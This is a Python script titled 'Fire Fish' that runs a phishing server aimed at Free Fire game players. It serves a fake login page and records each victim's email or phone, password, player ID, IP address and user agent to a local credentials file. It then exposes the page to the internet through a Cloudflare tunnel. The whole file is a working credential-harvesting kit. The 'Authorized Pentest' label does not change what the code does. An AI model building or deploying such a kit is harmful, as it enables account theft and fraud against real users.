#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import json
import os
import threading
import time
from datetime import datetime
import subprocess
import sys

PORT = 8080
CREDS_FILE = "credentials.txt"
VISITS_FILE = "visits.log"
HTML_DIR = "static"

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def do_GET(self):
        self.log_visit()
        parsed_path = urllib.parse.urlparse(self.path)

        if parsed_path.path == "/":
            self.path = "/static/index.html"

        elif parsed_path.path == "/static/success.html":
            self.send_success()
            return

        elif parsed_path.path == "/favicon.ico":
            self.send_favicon()
            return

        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        parsed_data = urllib.parse.parse_qs(post_data)

        email_phone = parsed_data.get('email_phone', ['N/A'])[0]
        password = parsed_data.get('password', ['N/A'])[0]
        player_id = parsed_data.get('player_id', ['N/A'])[0]
        ip_address = self.client_address[0]
        
        self.send_response(302)
        self.send_header('Location', '/static/success.html')
        self.end_headers()

        victim_data = {
            'timestamp': datetime.now().isoformat(),
            'ip_address': ip_address,
            'email_phone': email_phone,
            'password': password,
            'player_id': player_id,
            'user_agent': self.headers.get('User-Agent', 'unknown'),
            'all_data': dict((k, v[0]) for k, v in parsed_data.items())
        }

        with open(CREDS_FILE, 'a') as f:
            json.dump(victim_data, f, indent=2)
            f.write('\n\n')

        print(f"🎣 CAPTURED from {ip_address}:")
        print(f"   📧 Email/Phone: {email_phone}")
        print(f"   🔑 Password: {password}")
        print(f"   🆔 Player ID: {player_id}")
        print("-" * 60)

        self.send_response(302)
        self.send_header('Location', '/success.html')
        self.end_headers()

    def log_visit(self):
        visit_data = {
            'timestamp': datetime.now().isoformat(),
            'ip': self.client_address[0],
            'path': self.path,
            'user_agent': self.headers.get('User-Agent', 'unknown')[:100]
        }
        with open(VISITS_FILE, 'a') as f:
            json.dump(visit_data, f)
            f.write('\n')

    def send_phishing_page(self):
        try:
            with open(os.path.join(HTML_DIR, 'index.html'), 'r') as f:
                html = f.read()
        except FileNotFoundError:
            html = self.get_phishing_html_fallback()
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('X-Frame-Options', 'DENY')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))

    def send_success(self):
        try:
            with open(os.path.join(HTML_DIR, 'success.html'), 'r') as f:
                html = f.read()
        except FileNotFoundError:
            html = self.get_success_html()
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))

    def send_favicon(self):
        self.send_response(200)
        self.send_header('Content-Type', 'image/x-icon')
        self.end_headers()
        self.wfile.write(b'')

    # Fallback methods (if HTML files missing)
    def get_phishing_html_fallback(self):
        return "<h1>Phishing page loading...</h1>"
    
    def get_success_html(self):
        return "<h1>Success! Check your credentials.txt</h1>"

def start_cloudflared():
    print("🌐 Starting Cloudflare Tunnel...")
    try:
        subprocess.Popen(['cloudflared', 'tunnel', '--url', f'http://127.0.0.1:{PORT}'], 
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(3)
        print("✅ Start Cloudflare Tunnel In New Session!")
        return True
    except FileNotFoundError:
        print("❌ Install cloudflared:")
        print("wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared")
        print("chmod +x cloudflared && mv cloudflared $PREFIX/bin/")
        return False

# ASCII Banner & Colors
FIRE_FISH = [
    "███████╗██╗██████╗ ███████╗    ███████╗██╗███████╗██╗  ██╗",
    "██╔════╝██║██╔══██╗██╔════╝    ██╔════╝██║██╔════╝██║  ██║",
    "█████╗  ██║██████╔╝█████╗      █████╗  ██║███████╗███████║",
    "██╔══╝  ██║██╔══██╗██╔══╝      ██╔══╝  ██║╚════██║██╔══██║",
    "██║     ██║██║  ██║███████╗    ██║     ██║███████╗██║  ██║",
    "╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝",
]

RED, GREEN, YELLOW, BLUE, CYAN, WHITE, RESET = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[96m", "\033[97m", "\033[0m"
BOLD, DIM = "\033[1m", "\033[2m"

def term_width():
    import shutil
    try:
        return shutil.get_terminal_size().columns
    except:
        return 80

def center(text):
    return text.center(term_width())

def animated_banner(duration=2.5, delay=0.12):
    import time, os
    end = time.time() + duration
    i = 0
    COLORS = [RED, YELLOW, BLUE, CYAN, WHITE]
    
    while time.time() < end:
        os.system("clear")
        color = COLORS[i % len(COLORS)]
        for line in FIRE_FISH:
            print(color + center(line) + RESET)
        print()
        print(CYAN + center("🔥 FIRE FISH :: Real-Time Server Engine") + RESET)
        print(WHITE + center("© Adwaith Pramod") + RESET)
        time.sleep(delay)
        i += 1

def main():
    animated_banner()
    
    print(RED + "🚀 Free Fire Phishing Server (Authorized Pentest)" + RESET)
    print(BLUE + "=" * 75 + RESET)
    print(CYAN + "📱 Professional Design | Real-time Validation | Trust Indicators" + RESET)
    print(BLUE + "=" * 75 + RESET)
    
    # Create directories and files
    os.makedirs(HTML_DIR, exist_ok=True)
    
    threading.Thread(target=start_cloudflared, daemon=True).start()
    
    with socketserver.TCPServer(("", PORT), PhishingHandler) as httpd:
        print(GREEN + f"✅ Local Server: http://127.0.0.1:{PORT}" + RESET)
        print(YELLOW + "🎣 Credentials: tail -f credentials.txt" + RESET)
        print(CYAN + "📊 Visits: tail -f visits.log" + RESET)
        print(RED + "🛑 Ctrl+C to stop" + RESET)
        print(BLUE + "=" * 75 + RESET)
        
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print(YELLOW + "\n👋 Server stopped" + RESET)

if __name__ == "__main__":
    main()
